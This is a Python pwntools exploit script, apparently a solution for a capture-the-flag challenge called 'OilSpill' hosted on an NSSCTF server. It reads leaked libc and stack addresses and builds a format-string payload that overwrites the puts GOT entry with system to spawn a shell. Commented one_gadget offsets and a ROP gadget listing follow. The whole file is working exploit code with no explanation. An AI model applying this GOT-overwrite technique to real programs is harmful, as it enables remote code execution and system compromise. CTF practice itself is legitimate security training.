from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])



# io=process("./OilSpill")
io=remote("node2.anna.nssctf.cn",28755)
elf=ELF("./OilSpill")
libc=ELF("./libc.so")

pop_rdi_ret=0x4007e3
ret=0x400536
x=0x600C80
puts_got=elf.got[b"puts"]

libc_addr=int(io.recvuntil(b", ")[:-2],16)-libc.sym[b"puts"]
printf_addr=int(io.recvuntil(b", ")[:-2],16)
stack_addr=int(io.recvuntil(b", ")[:-2],16)
# temp=int(io.recvuntil(b", ")[:-2],16)
print("libc_addr: "+hex(libc_addr))
print("stack_addr: "+hex(stack_addr))
print("printf_addr: "+hex(printf_addr))

# gdb.attach(io)
# pause()


str_bin_sh=libc_addr+next(libc.search(b"/bin/sh"))
sys_addr=libc_addr+libc.sym[b"system"]
# one_gadget=[0x4f2a5,0x4f302,0x10a2fc]
# shell=one_gadget[1]+libc_addr


io.recvuntil(b"clean it?\n")
payload=fmtstr_payload(8,{puts_got:sys_addr,x:b"/bin/sh\x00"})
io.sendline(payload)
io.interactive()

# 0x4f2a5 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   rsp & 0xf == 0
#   rcx == NULL

# 0x4f302 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a2fc execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL

# Gadgets information
# ============================================================
# 0x00000000004007dc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004007de : pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004007e0 : pop r14 ; pop r15 ; ret
# 0x00000000004007e2 : pop r15 ; ret
# 0x00000000004007db : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004007df : pop rbp ; pop r14 ; pop r15 ; ret
# 0x00000000004005f8 : pop rbp ; ret
# 0x00000000004007e3 : pop rdi ; ret
# 0x00000000004007e1 : pop rsi ; pop r15 ; ret
# 0x00000000004007dd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400536 : ret
# 0x00000000004006cb : ret 0x8b48

# Unique gadgets found: 12
